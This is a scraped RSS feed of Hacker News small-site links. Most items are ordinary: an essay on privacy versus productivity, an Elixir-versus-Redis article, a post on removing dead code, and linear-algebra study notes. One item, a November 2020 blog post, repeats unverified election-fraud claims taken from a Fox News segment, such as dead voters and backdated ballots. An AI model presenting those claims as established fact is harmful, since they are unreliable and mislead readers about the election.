(decreased input), all other things being equal, we’ll end up seeing those gains reflected in our outputs.</p><h2>Productivity gains are discovered, not planned</h2><p>What exactly are the things that increase efficiency? Here's where it gets tricky. In the realm of knowledge work, we don't always know where the gains will come from — that is, before they are made. We are still discovering new ways in which we can be more productive and especially so in the domain of collaborative productivity. An illustrative example of how productivity gains are discovered comes from Kevin A. Kwok's description of Figma's road to success.</p><p>In "Why Figma Wins", <a href="https://kwokchain.com/2020/06/19/why-figma-wins/">Kwok details</a> how the product team discovered a way to enable more efficient collaboration in the design process. That this potential existed wasn't at all  obvious to even those within the scene. While Sketch had broken new ground with their vector based design tool geared towards product designers, Figma took it to another level by taking many of the same (dare I say revolutionary) UX patterns and offering them in a web-native, multiplayer web application.</p><blockquote><p>The core insight of Figma is that design is larger than just designers. Design is all of the conversations between designers and PMs about what to build. It is the mocks and prototypes and the feedback on them. It is the handoff of specs and assets to engineers and how easy it is for them to implement them.</p></blockquote><p>As Kevin explains, Figma brought together the disparate disciplines that are involved in a design process into a synced browser window for everybody. This helped democratize design and remove a lot of friction that had existed before.</p><p>Not only did Figma push the frontier of productivity into new territory, it wasn’t obvious beforehand what that territory would look like. The lesson is that productivity improvements are won through a process of <em>discovery</em>. Kevin explains:</p><blockquote><p>As disciplines evolve, they figure out the social norms needed to operate better, build tools that can be shared across the industry, and invent abstractions that allow offloading more and more of the workload. They learn how to collaborate better, not just with each other but with all the other functions as well.</p></blockquote><p>Although there's some inherent uncertainty about what the productivity gains will look like (and where to look for them), there's no uncertainty about whether they will be made at all. If one thing can be counted on, it's the tech industry's relentless march towards higher productivity. The big tech platforms know this and don't shy away from investing heavily in innovation (discovery) in that direction.</p><h2>Productivity gains are unlocked by harvesting data</h2><p>Although there is some inherent tension between preserving privacy vs. allowing for a multiplayer mode like Figma, we can find even stronger tensions when it comes to harvesting data in favor of productivity gains.</p><p>A search feature relies on indexing your data. A recommendation feature relies on mining your browsing history. An autocomplete feature relies on what you (or other users) typed before.</p><p>All these potential features which are made possible through harvesting your user data are not available to privacy-preserving products. The user data isn't readable to them — and that's the whole point.</p><p>This creates a trade-off from the user's perspective. Whatever your particular motivation might be, as soon as you opt for a privacy-preserving service you're opting for a service that is not able to read your data, and by extension, not able to harvest it. Because the harvesting of data is what is driving many of the improvements in productivity, in choosing to preserve user privacy, these services are forgoing their ability to provide additional gains in productivity.</p><p>Historically, as we saw with the origins of GPG, there has always been additional friction involved in replicating a workflow in a privacy-preserving manner. Although using e2e services such as Signal and ProtonMail has become nearly frictionless, they lack many features their non-privacy preserving counterparts offer.</p><h2>The productivity gap between privacy-preserving and non-preserving services</h2><p>If you compare the productivity gains between privacy-preserving and non-preserving products from the perspective of the user, it's hard not to arrive at the conclusion that there’s a gap between the two — and it appears to be growing.</p><p>There is perhaps no better example of a feature which hinges on the ability to read user data than search. Although ProtonMail is reminiscent of Gmail in many ways, one area where it falls short is the absence of any ability to  search the contents of your emails. Search only works if the provider of such functionality can scan and index your content. It works even better if the provider is able to harvest search queries and use those to build predictive models (e.g. autocomplete and smart suggestions). These are features which make Gmail users more productive but aren't available to ProtonMail users <!-- -->[3]<!-- -->.</p><p>The absence of search might not be a dealbreaker for a …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jessems.com/productivity-vs-privacy">https://jessems.com/productivity-vs-privacy</a></em></p>]]>
            </description>
            <link>https://jessems.com/productivity-vs-privacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059205</guid>
            <pubDate>Wed, 11 Nov 2020 15:37:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public Safety Announcement: The 2020 Election Is Not Over]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25059009">thread link</a>) | @lettergram
<br/>
November 11, 2020 | https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3754">

<div>
<p>I have been listening to my friends and family and am concerned that many are not aware of the election process. Having the presidential election flip from Democrat to Republican at this point can cause massive rioting, violence, etc.</p>
<p>We should all be aware of the current situation and the news outlets do not appear to be informing people.</p>
<blockquote><p><strong>Disclaimer</strong>: I’m am not pro-democrat or pro-republican. Personally, I believe neither party is fit to run the country.</p></blockquote>
<p>I wanted to share what appears to be the Republican strategy and why it’s possible (though still unlikely) Trump could win.</p>
<p>At time of writing Trump the betting markets have <a href="https://electionbettingodds.com/4hr.html" target="_blank" rel="noopener noreferrer">13% odds of winning the election</a> (odds calculated average from <a href="https://www.betfair.com/exchange/plus/politics">Betfair</a> and <a href="https://www.predictit.org/promo/electionbetting">PredictIt</a>).</p>
<p><a href="https://www.predictit.org/markets/detail/3698/Who-will-win-the-2020-US-presidential-election" target="_blank" rel="noopener noreferrer">PredictIt</a> currently has 16% odds of Trump winning:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" alt="" width="500" height="344" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w"></a></p>
<h3>Biden is not Officially the President-Elect</h3>
<p>The president elect is determined by the electoral college or the General Services Administration (aka Trump conceding). That did not occur.</p>
<p>This is not uncommon, from <a href="https://en.wikipedia.org/wiki/President-elect_of_the_United_States" target="_blank" rel="noopener noreferrer">wikipedia</a>:</p>
<blockquote><p>The closest instance of there being no qualified person to take the presidential oath of office on Inauguration Day happened in 1877 when the disputed election between Rutherford B. Hayes and Samuel J. Tilden was decided and certified in Hayes’ favor just three days before the inauguration (then March 4).</p></blockquote>
<h3>Evidence, Pending Review</h3>
<p>It takes time to build evidence. Last night on <a href="https://www.youtube.com/watch?v=7WzYTSwt18k" target="_blank" rel="noopener noreferrer">Fox News (Hannity, 11/10/2020)</a> the Republicans discussed some of the election (video may be removed, not on Fox News website).</p>
<p>The Republicans claim 11,000+ incident reports of vote manipulation, currently being vetted by attorneys. 250+ affidavits already signed, many have corroborating physical evidence, photos or additional witnesses (unclear how much). In a section below, some specific claims are covered.</p>
<h3>The Voting Recount Process</h3>
<ol>
<li>Affidavit is necessary to challenge some ballots</li>
<li>After canvassing, Republicans can request a recount</li>
<li>A judges in each county can review evidence (aka affidavits, photos, etc)</li>
<li>The judge can remove ballots (at random) based on evidence</li>
<li>Judgements can be challenged to a higher court</li>
<li>Recount occurs after ballots removed</li>
<li>IF it’s so wide spread or there’s a major error. The house or senate decide (or special elections), it depends on the State.</li>
<li>Electors vote on to December 14 and delivered December 23rd [<a href="https://crsreports.congress.gov/product/pdf/IF/IF11641">1</a>]</li>
</ol>
<h4>State Government Affiliation(s)</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pennsylvania_General_Assembly" target="_blank" rel="noopener noreferrer">PA</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Legislature" target="_blank" rel="noopener noreferrer">MI</a>, <a href="https://en.wikipedia.org/wiki/Wisconsin_Legislature" target="_blank" rel="noopener noreferrer">WI</a> and <a href="https://en.wikipedia.org/wiki/Georgia_General_Assembly" target="_blank" rel="noopener noreferrer">GA</a> have a fairly large republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Arizona_State_Legislature" target="_blank" rel="noopener noreferrer">AZ</a> has a slight republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Nevada_Legislature" target="_blank" rel="noopener noreferrer">NV</a> has a large Democrat majority in both houses</li>
</ul>
<p>It’s also still possible the United States Supreme Court could still toss hundreds of thousands of ballots out of PA (Biden’s up by 40k)[<a href="https://www.washingtonexaminer.com/news/republican-state-attorneys-general-ask-supreme-court-to-take-up-pennsylvania-late-mail-in-ballot-case" target="_blank" rel="noopener noreferrer">2</a>].</p>
<h3>Affidavit Claims</h3>
<p>Selected claims on Fox / Hannity (on 11/10/2020):</p>
<p>1. There was a “software bug” in one jurisdiction, the exact same software was used in half of Michigan and multiple states. Only the one county noted the fix. They want to re-evaluate and manually recount in said counties. Code reviews requested.</p>
<p>2. Pennsylvania USPS (more than one) said the postal service was backdating ballots AND collecting ballots after the date (prior to back dating, i.e. they knew)</p>
<p>3. Michigan had a lot of dead people vote &gt;50 for one county, thus far that they’ve found.</p>
<p>4. All the states have laws enabling the voting process to be accessible to the public, due to COVID-19 they limited public observers, particularly from independents. Legal challenges can occur, as that is against many states laws.</p>
<p>5. Democrat poll watchers were handing out pamphlets on “how to distract GOP poll watchers”</p>
<p>6. Poll watchers claim to have seen ballots with the same or no signatures be counted in Michigan</p>
<h3>Personal Opinion</h3>
<p>Personally, I believe this is the correct course of action. I’m not sure I believe all the claims.</p>
<p>However, I think it’s very important we challenge the votes, see where it falls and improve the Republic. Even if we do it after the election, it’s important we identify fraud and / or improve the process so this doesn’t happen again.</p>
<p>Unfortunately, the news media is not presenting this very well. I am concerned this will lead to a civil war. The Democratic party knows they are not officially the president elect, yet hold press conferences, that look like this…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" alt="" width="792" height="530" srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w"></a>I’m not convinced this wont lead to violence. I’m concerned because it looks like <em>if the Democrats lose the election.</em> There will be a rival government setup. Several <a href="https://www.cnn.com/2020/11/07/americas/biden-global-reaction-election-intl/index.html" target="_blank" rel="noopener noreferrer">foreign powers have already acknowledged Biden as the victor</a>, for instance.</p>
<p>Personally, I just want a safe environment for my friends and family. I think most of us do.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059009</guid>
            <pubDate>Wed, 11 Nov 2020 15:14:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You may not need Redis with Elixir]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058805">thread link</a>) | @wojtekmach
<br/>
November 11, 2020 | https://dashbit.co/blog/you-may-not-need-redis-with-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/you-may-not-need-redis-with-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> November 11th, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/redis">redis</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/pubsub">pubsub</a>, <a href="https://dashbit.co/blog/tags/processes">processes</a>
  </li>
</ul>
<p>
If you have participated in a discussion about Elixir, you may have heard “you may not need Redis with Elixir”. Given that Redis has many use cases, this sentence may confuse developers as they try to match Elixir’s different features against Redis’ capabilities. This article aims to explore different scenarios where the above is true, when they are not, and which trade-offs you may want to consider. We will discuss four cases:</p>
<ol>
  <li>
<a href="#post-pubsub">Distributed PubSub</a>  </li>
  <li>
<a href="#post-presence">Presence</a>  </li>
  <li>
<a href="#post-caching">Caching</a>  </li>
  <li>
<a href="#post-async">Asynchronous processing</a>  </li>
</ol>
<p>
Before we start, I want to emphasize we find Redis a fantastic piece of technology. This is not a critique of Redis but rather a discussion of the different options Elixir developers may have available.</p>
<h2 id="post-pubsub">
  Case #1: Distributed PubSub</h2>
<p>
The first scenario where you may not need Redis with Elixir is Distributed <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>. Throughout this section, we will consider PubSub systems to provide <strong>at-most-once delivery</strong>: they broadcast events to the currently available subscribers. If a subscriber is not around, they won’t receive the message later.</p>
<p>
For this reason, PubSub systems are often paired with databases to offer persistence. For example, every time someone sends a message in a chat application, the system can save the contents to the database and then broadcast it to all users. This means everyone connected at a given moment sees the update immediately, but disconnected users can catch up later.</p>
<p>
Imagine that you have multiple nodes, and you want to exchange messages between said nodes. In Elixir, thanks to the Erlang VM, which ships with distribution support, this can be as simple as:</p>
<pre><code><span>for</span><span> </span><span>node</span><span> </span><span>&lt;-</span><span> </span><span>Node</span><span>.</span><span>list</span><span data-group-id="8737372369-1">(</span><span data-group-id="8737372369-1">)</span><span> </span><span data-group-id="8737372369-2">do</span><span>
  </span><span>send</span><span data-group-id="8737372369-3">(</span><span data-group-id="8737372369-4">{</span><span>:known_name</span><span>,</span><span> </span><span>node</span><span data-group-id="8737372369-4">}</span><span>,</span><span> </span><span>:hello_world</span><span data-group-id="8737372369-3">)</span><span>
</span><span data-group-id="8737372369-2">end</span></code></pre>
<p>
In <a href="https://github.com/phoenixframework/phoenix_pubsub/blob/master/lib/phoenix/pubsub.ex">200LOC or less</a>, you can implement a PubSub system that broadcasts to all subscribers within the same node or anywhere else in a cluster, without bringing any third-party tools. At best, you will need <a href="https://github.com/bitwalker/libcluster">libcluster</a> - an Elixir library - to establish the connection between the nodes based on some strategy (K8s, AWS, DNS, etc.).</p>
<p>
In other words, PubSub pretty much ships out of the box with Elixir. Technologies without distribution would need to rely on Redis PubSub, PostgreSQL Notifications, or similar to achieve the same.</p>
<p>
Of course, the above assumes your infrastructure allows you to directly establish connections between nodes, which may not be possible in some PaaS, such as Heroku. In those cases, you can use any of the technologies above (Phoenix <a href="https://dashbit.co/blog/github.com/phoenixframework/phoenix_pubsub_redis/">has a Redis adapter</a> for its PubSub), or alternatively use platforms, such as <a href="https://www.gigalixir.com/">Gigalixir</a>, that make it trivial to setup a cluster.</p>
<h2 id="post-presence">
  Case #2: Presence</h2>
<p>
Presence is the ability to track who is connected in a cluster right now — the “who” may be users, phones, IoT devices, etc. For example, if Alice is connected to node A, she wants to see that Bob is also available, even if he has joined node B.</p>
<p>
Presence is one of the problems that are more complicated to implement than it sounds. For example, let’s consider implementing Presence by storing the connected entities in a database. However, what happens if a node crashes or leaves the cluster? Because the node crashed, all the users connected to it must be removed, but the node itself cannot do so. Therefore the other nodes need to detect those failure scenarios and act accordingly. But observing failures in a distributed system is also complicated: how do you differentiate between a temporarily unresponsive node from one that permanently failed?</p>
<p>
Another common approach to solve this problem is to frequently write to a database while users are connected. If you have seen no writes within a timeframe, you consider those users to be disconnected. However, such solutions have to choose between being write-intensive or inaccurate. For instance, let’s say that users become disconnected after 1 minute. This means that you need to write to the database every 1 minute for every user. If you have 10k users, that’s 167 writes per second, only to track that the users are connected. Meanwhile, the gap between a user leaving and having their status reflected in the UI is, in the worst-case scenario, also 1 minute. Any attempt at reducing the number of writes implies an increased gap.</p>
<p>
Given Elixir’s clustering support, we can once more implement <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> without a need for third-party dependencies! We use a PubSub system to implement Presence, as we need to notify as users join and leave. Instead of relying on centralized storage, the nodes directly communicate and exchange information about who is around. This removes the need for frequent writes. When a user leaves, this is also reflected immediately.</p>
<p>
So while you can use Redis or another storage to provide Presence, Elixir can deliver a solution that is efficient and doesn’t require third-party tools.</p>
<h2 id="post-caching">
  Case #3: Caching</h2>
<p>
The solutions to previous cases were built on top of Erlang’s unique distribution capabilities. In the following sections, the distinguishing factor between needing Redis or not will be <strong>multi-core concurrency</strong>, so this discussion is more generally applicable. Therefore, when we say Elixir in this section, it will also apply to JVM, Go, and other environments. They will contrast to Ruby, Python, and Node.js, in which their primary runtimes do not provide adequate multi-core concurrency within a single Operating System process.</p>
<p>
Let’s start with the non-concurrent scenario. Consider you are building a web application in Ruby, Python, etc. To deploy it, you get two eight-core machines. In languages that do not provide satisfactory multi-core concurrency, a common option for deployment is to start 8 instances of your web application, one per core, on each node. Overall, you will have CxN instances, where C is the number of cores, and N is the number of nodes.</p>
<p>
Now consider a particular operation in this application that is expensive, and you want to cache its results. The easiest solution, regardless of your programming environment, is to cache it in memory. However, given we have 16 instances of this application, caching it in memory is suboptimal: we will have to perform this expensive operation at least 16 times, one for each instance. For this reason, it is widespread to use Redis, Memcached, or similar for caching in environments like Ruby, Python, etc. With Redis, you would cache it only once, and it will be shared across all instances. The trade-off is that we are replacing memory access by a network round-trip, and the latter is orders of magnitude more expensive.</p>
<p>
Now let’s consider environments with multi-core concurrency. In languages like Elixir, you start one instance per node, regardless of the number of cores, since the runtime will share memory and efficiently spread the work across all cores. When it comes to caching, keeping the cache in-memory is a much more affordable scenario, as you will only have to compute once per node. Therefore, you have the <em>option</em> to skip Redis or Memcached altogether and avoid network round-trip.</p>
<p>
Of course, this depends on how many nodes you are effectively running in production. Luckily, many companies report being able to <a href="https://dev.to/erlangsolutions/why-elixir-is-the-programming-language-you-should-learn-in-2020-5g00">run Elixir with an order of magnitude less nodes</a> than technologies they have migrated from.</p>
<p>
You can also choose a mixed approach and store the cache both in-memory and in Redis. First, you look up in memory and, if missing, you fallback to Redis. If unavailable in both, then you execute the operation and cache it in each. The critical part to highlight here is that multi-core environments give you more flexibility to tackle these problems while reducing resource utilization. In Elixir/Erlang, you can also keep the cache in memory and use PubSub to distribute it across nodes. You can see this last approach in action <a href="https://github.com/tompave/fun_with_flags">in the excellent FunWithFlags library</a>.</p>
<p>
Another trade-off to consider is that all in-memory cache will be gone once you deploy new nodes. Therefore, if you need data to persist across deployments, you will want to use Redis as a cache layer, as detailed above, or dump the cache in a storage, such as database, S3, or Redis, before each deployment.</p>
<h2 id="post-async">
  Case #4: Asynchronous processing</h2>
<p>
Another scenario you may not need Redis in Elixir is to perform asynchronous processing. Let’s continue the discussion from the previous case.</p>
<p>
In environments without or with limited multi-core concurrency, given each instance is assigned to one core, they are limited in their ability to handle requests concurrently. This has led to a common saying that “you should avoid blocking the main thread”. For example, imagine that your application has to deliver emails on sign up or generate some computationally expensive reports. While one of your 16 web instances is doing this, it cannot handle other incoming requests efficiently. For this reason, a common choice here is to move the work elsewhere, typically a background-job processing queue. First, you store the work to be done on Redis or similar. Then one of the 16 web instances (or more commonly a completely different set of workers) grabs it from the queue.</p>
<p>
In multi-core concurrent environments, requests can be handled concurrently regardless if they are doing CPU or IO work. Sending the email from the request itself won’t block other requests. Generating the report is not a problem, as requests can be served by other CPUs. These platforms typically get assigned as many requests as they can handle and they distribute the work over the machine resources. Even if you prefer to deliver emails outside of the request, in order to send an earlier response to users, you can spawn an asynchronous worker without a need to move the delivery to an external queue or to another machine. Once again, concurrency gives us a more straightforward option to tackle these scenarios.</p>
<p>
Note the Erlang VM takes care of multiplexing CPU and IO work without a need for developers to tag functions as async or similar. Workers in Erlang/Elixir are …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/you-may-not-need-redis-with-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058805</guid>
            <pubDate>Wed, 11 Nov 2020 14:48:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systematically removing code]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 45 (<a href="https://news.ycombinator.com/item?id=25058632">thread link</a>) | @jerodsanto
<br/>
November 11, 2020 | https://thepugautomatic.com/2020/11/systematically-removing-code/ | <a href="https://web.archive.org/web/*/https://thepugautomatic.com/2020/11/systematically-removing-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><hgroup><p><span>Written November 8, 2020. <span>Tagged <a href="https://thepugautomatic.com/tag/methodology">Methodology</a>.</span></span></p></hgroup><div><p>It's easy to miss things when removing code, leaving behind unused methods, templates, CSS classes or translation keys. (Especially in a dynamic language like Ruby, without a compiler to help you spot dead code.)</p><p>I avoid this by removing code systematically, line by line, depth-first.</p><p>This is one of those things that seems obvious when you do it, but in my experience, many people do it haphazardly.</p><p>Say we wanted to remove the "item box" from this page:</p><p>page.html.erb</p><pre><code><span><span><span>&lt;</span>p</span><span>&gt;</span></span>Welcome to my page!<span><span><span>&lt;/</span>p</span><span>&gt;</span></span><p><span><span>&lt;%=</span> render<span>(</span><span>"item_box"</span><span>,</span> item<span>:</span> item<span>)</span> <span>%&gt;</span></span></p></code></pre><p>_item_box.html.erb</p><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box box--fancy<span>"</span></span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>h2</span><span>&gt;</span></span><span><span>&lt;%=</span> item<span>.</span>title <span>%&gt;</span></span><span><span><span>&lt;/</span>h2</span><span>&gt;</span></span><br>  <span><span>&lt;%=</span> format_description<span>(</span>item<span>.</span>description<span>)</span> <span>%&gt;</span></span><br>  <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span><span>&lt;%=</span> <span>I18n</span><span>.</span>translate<span>(</span><span>"my.translation.key"</span><span>)</span> <span>%&gt;</span></span><br><span><span><span>&lt;/</span>div</span><span>&gt;</span></span></code></pre><p>So our end goal is to remove the <code>&lt;%= render("item_box", item: item) %&gt;</code> line.</p><p>First, we search the project to check that <code>_item_box.html.erb</code> isn't used somewhere else, or referenced in docs that we'll need to update. It isn't, so we're OK to remove it – but before we do that, we must go through it line by line.</p><p>The first line is <code>&lt;div class="box box--fancy"&gt;</code>. So we search the project for these two CSS classes, checking if they're in use somewhere else. If not, we remove them from the CSS files.</p><p>We go deeper if required – perhaps the CSS for <code>.box--fancy</code> uses a CSS variable. Then we check if that variable is in use elsewhere. <a href="https://thepugautomatic.com/2014/03/stacked-vim-searches-down-cold/">Stacked searches in Vim</a> are helpful here.</p><p>Once we've checked a line in the file, we delete that line. This helps us keep track of what we've already checked.</p><p>So after we've checked and removed that line, we're left with</p><p>_item_box.html.erb</p><pre><code>  <span><span><span>&lt;</span>h2</span><span>&gt;</span></span><span><span>&lt;%=</span> item<span>.</span>title <span>%&gt;</span></span><span><span><span>&lt;/</span>h2</span><span>&gt;</span></span><br>  <span><span>&lt;%=</span> format_description<span>(</span>item<span>.</span>description<span>)</span> <span>%&gt;</span></span><br>  <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span><span>&lt;%=</span> <span>I18n</span><span>.</span>translate<span>(</span><span>"my.translation.key"</span><span>)</span> <span>%&gt;</span></span><br><span><span><span>&lt;/</span>div</span><span>&gt;</span></span></code></pre><p>And we continue this way, line by line. Is the <code>item.title</code> used elsewhere? If not, we should probably remove it, too. What about <code>format_description</code>, <code>item.description</code>, the <code>my.translation.key</code> translation key?</p><p>Again, we go deeper if required, not removing the <code>format_description</code> method until we've gone through <em>it</em> line by line.</p><p>When we've looked at every line in <code>_item_box.html.erb</code> and deleted them as we went, the file will be empty, and we can start popping the stack.</p><p>We remove the empty <code>_item_box.html.erb</code> file.</p><p>And we can finally remove the <code>&lt;%= render("item_box", item: item) %&gt;</code> line, fairly confident that we didn't leave dead code behind.</p><p>This probably sounds more tedious than it is. It tends to be quick work, and you can take shortcuts – removing a swathe of lines that don't reference anything else, or that only call methods that you know are used elsewhere.</p></div></section></div><div><p>Content and design © <a href="https://henrik.nyh.se/">Henrik Nyh</a> (<a href="https://twitter.com/henrik">@henrik</a>). Code is under a <a href="http://en.wikipedia.org/wiki/MIT_License">MIT License</a> unless otherwise stated.</p><p>Pug art by <a href="https://johannaost.com/">Johanna Öst</a>; other graphics are under a <a href="http://creativecommons.org/licenses/by/3.0/">CC BY License</a>.</p><p>Powered by <a href="https://11ty.dev/">Eleventy</a>.</p></div></div>]]>
            </description>
            <link>https://thepugautomatic.com/2020/11/systematically-removing-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058632</guid>
            <pubDate>Wed, 11 Nov 2020 14:26:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Linear Algebra for Applied Machine Learning with Python]]>
            </title>
            <description>
<![CDATA[
Score 412 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25058619">thread link</a>) | @Anon84
<br/>
November 11, 2020 | https://pabloinsente.github.io/intro-linear-algebra | <a href="https://web.archive.org/web/*/https://pabloinsente.github.io/intro-linear-algebra">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        
<!-- https://docs.mathjax.org/en/latest/configuration.html#local-config-files -->




<article>
  <h2>Introduction to Linear Algebra for Applied Machine Learning with Python</h2>
  <time datetime="2020-05-26T00:00:00+00:00">26 May 2020</time>
  

  

<p>Linear algebra is to machine learning as flour to bakery: <strong>every machine learning model is based in linear algebra, as every cake is based in flour</strong>. It is not the only ingredient, of course. Machine learning models need vector calculus, probability, and optimization, as cakes need sugar, eggs, and butter. Applied machine learning, like bakery, is essentially about combining these mathematical ingredients in clever ways to create useful (tasty?) models.</p>

<p>This document contains <strong>introductory level linear algebra notes for applied machine learning</strong>. It is meant as a reference rather than a comprehensive review. If you ever get confused by matrix multiplication, don’t remember what was the $L_2$ norm, or the conditions for linear independence, this can serve as a quick reference. It also a good introduction for people that don’t need a deep understanding of linear algebra, but still want to learn about the fundamentals to read about machine learning or to use pre-packaged machine learning solutions. Further, it is a good source for people that learned linear algebra a while ago and need a refresher.</p>

<p>These notes are based in a series of (mostly) freely available textbooks, video lectures, and classes I’ve read, watched and taken in the past. If you want to obtain a deeper understanding or to find exercises for each topic, you may want to consult those sources directly.</p>

<p><strong>Free resources</strong>:</p>

<ul>
  <li><strong>Mathematics for Machine Learning</strong> by Deisenroth, Faisal, and Ong. 1st Ed. <a href="https://mml-book.github.io/">Book link</a>.</li>
  <li><strong>Introduction to Applied Linear Algebra</strong> by Boyd and Vandenberghe. 1sr Ed. <a href="http://vmls-book.stanford.edu/">Book link</a></li>
  <li><strong>Linear Algebra Ch. in Deep Learning</strong> by Goodfellow, Bengio, and Courville. 1st Ed. <a href="https://www.deeplearningbook.org/contents/linear_algebra.html">Chapter link</a>.</li>
  <li><strong>Linear Algebra Ch. in Dive into Deep Learning</strong> by Zhang, Lipton, Li, And Smola. <a href="https://d2l.ai/chapter_preliminaries/linear-algebra.html">Chapter link</a>.</li>
  <li><strong>Prof. Pavel Grinfeld’s Linear Algebra Lectures</strong> at Lemma. <a href="https://www.lem.ma/books/AIApowDnjlDDQrp-uOZVow/landing">Videos link</a>.</li>
  <li><strong>Prof. Gilbert Strang’s Linear Algebra Lectures</strong> at MIT. <a href="https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/video-lectures/">Videos link</a>.</li>
  <li><strong>Salman Khan’s Linear Algebra Lectures</strong> at Khan Academy. <a href="https://www.khanacademy.org/math/linear-algebra">Videos link</a>.</li>
  <li><strong>3blue1brown’s Linear Algebra Series</strong> at YouTube. <a href="https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Videos link</a>.</li>
</ul>

<p><strong>Not-free resources</strong>:</p>

<ul>
  <li><strong>Introduction to Linear Algebra</strong> by Gilbert Strang. 5th Ed. <a href="https://www.amazon.com/Introduction-Linear-Algebra-Gilbert-Strang/dp/0980232775">Book link</a>.</li>
  <li><strong>No Bullshit Guide to Linear Algebra</strong> by Ivan Savov. 2nd Ed. <a href="https://www.amazon.com/No-bullshit-guide-linear-algebra/dp/0992001021">Book Link</a>.</li>
</ul>

<p>I’ve consulted all these resources at one point or another. Pavel Grinfeld’s lectures are my absolute favorites. Salman Khan’s lectures are really good for absolute beginners (they are long though). The famous 3blue1brown series in linear algebra is delightful to watch and to get a solid high-level view of linear algebra.</p>

<p>If you have to pic one book, I’d pic <strong>Boyd’s and Vandenberghe’s Intro to applied linear algebra</strong>, as it is the most beginner friendly book on linear algebra I’ve encounter. Every aspect of the notation is clearly explained and pretty much all the key content for applied machine learning is covered. The Linear Algebra Chapter in Goodfellow et al is a nice and concise introduction, but it may require some previous exposure to linear algebra concepts. Deisenroth et all book is probably the best and most comprehensive source for linear algebra for machine learning I’ve found, although it assumes that you are good at reading math (and at math more generally). Savov’s book it’s also great for beginners but requires time to digest. Professor Strang lectures are great too but I won’t recommend it for absolute beginners.</p>

